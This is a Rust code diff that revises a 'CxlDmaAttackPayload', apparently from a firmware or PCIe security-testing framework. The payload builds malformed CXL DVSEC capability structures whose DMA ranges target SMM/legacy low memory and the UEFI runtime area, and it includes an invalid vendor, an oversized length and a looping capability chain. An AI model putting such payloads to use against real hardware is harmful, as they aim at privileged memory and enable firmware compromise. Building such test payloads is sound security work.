@@ -44,24 +44,23 @@ impl Payload for CxlDmaAttackPayload {
         // DVSEC Vendor ID — CXL consortium = 0x1E98
         data[ext_cap_offset + 4] = 0x98;
         data[ext_cap_offset + 5] = 0x1E;
-        // DVSEC Revision = 1
-        data[ext_cap_offset + 6] = 0x01;
-        // DVSEC Length = 0x38
-        data[ext_cap_offset + 7] = 0x00;
-        data[ext_cap_offset + 8] = 0x38;
-        data[ext_cap_offset + 9] = 0x00;
+        // DVSEC Revision (4 bits) << 12 | Length (12 bits)
+        // Revision = 1, Length = 0x38
+        let rev_len: u16 = (1 << 12) | 0x38;
+        data[ext_cap_offset + 6..ext_cap_offset + 8].copy_from_slice(&rev_len.to_le_bytes());
         // DVSEC ID = 0 (CXL.cache/mem device)
-        data[ext_cap_offset + 10] = 0x00;
-        data[ext_cap_offset + 11] = 0x00;
+        data[ext_cap_offset + 8] = 0x00;
+        data[ext_cap_offset + 9] = 0x00;
 
-        // CXL Device Capability — with DMA range in low memory
-        // Memory base — targets SMM area (< 1MB)
-        let mem_range_offset = ext_cap_offset + 0x20;
+        // HDM decoder range immediately after the DVSEC header (+16):
+        // base (8 bytes) then range size (4 bytes)
+        let mem_range_offset = ext_cap_offset + 16;
         // DMA range base = 0x000A0000 (legacy VGA area / SMM overlap)
         data[mem_range_offset..mem_range_offset + 4].copy_from_slice(&0x000A0000u32.to_le_bytes());
-        // DMA range limit = 0x000FFFFF (full low memory)
-        data[mem_range_offset + 4..mem_range_offset + 8]
-            .copy_from_slice(&0x000FFFFFu32.to_le_bytes());
+        data[mem_range_offset + 4..mem_range_offset + 8].copy_from_slice(&0x00000000u32.to_le_bytes());
+        // DMA range size = 0x60000 (covers through 0x000FFFFF)
+        data[mem_range_offset + 8..mem_range_offset + 12]
+            .copy_from_slice(&0x00060000u32.to_le_bytes());
 
         // Second CXL DVSEC at offset 0x200 with extended cap chain loop
         let ext_cap2_offset = 0x200;
@@ -75,19 +74,24 @@ impl Payload for CxlDmaAttackPayload {
         // DVSEC with non-standard vendor
         data[ext_cap2_offset + 4] = 0xFF;
         data[ext_cap2_offset + 5] = 0xFF; // Vendor 0xFFFF (invalid)
-        data[ext_cap2_offset + 6] = 0x02; // Revision 2
-                                          // DVSEC Length exceeding available data
-        data[ext_cap2_offset + 7] = 0x00;
-        data[ext_cap2_offset + 8] = 0xFF; // Length = 0xFF (255 bytes but only ~256 left in section)
+        // Revision (4 bits) << 12 | Length (12 bits): Revision 2, Length 0xFF
+        let rev_len2: u16 = (2 << 12) | 0xFF;
+        data[ext_cap2_offset + 6..ext_cap2_offset + 8].copy_from_slice(&rev_len2.to_le_bytes());
+        // DVSEC ID = 0
+        data[ext_cap2_offset + 8] = 0x00;
         data[ext_cap2_offset + 9] = 0x00;
 
+        // HDM decoder range after the second DVSEC header (+16):
         // DMA range targeting UEFI runtime region
-        let mem_range2_offset = ext_cap2_offset + 0x20;
+        let mem_range2_offset = ext_cap2_offset + 16;
         // DMA range base = 0x70000000 (UEFI runtime services area)
         data[mem_range2_offset..mem_range2_offset + 4]
             .copy_from_slice(&0x70000000u32.to_le_bytes());
         data[mem_range2_offset + 4..mem_range2_offset + 8]
-            .copy_from_slice(&0x7FFFFFFFu32.to_le_bytes());
+            .copy_from_slice(&0x00000000u32.to_le_bytes());
+        // DMA range size = 0x10000000 (covers through 0x7FFFFFFF)
+        data[mem_range2_offset + 8..mem_range2_offset + 12]
+            .copy_from_slice(&0x10000000u32.to_le_bytes());
 
         Ok(data)
     }
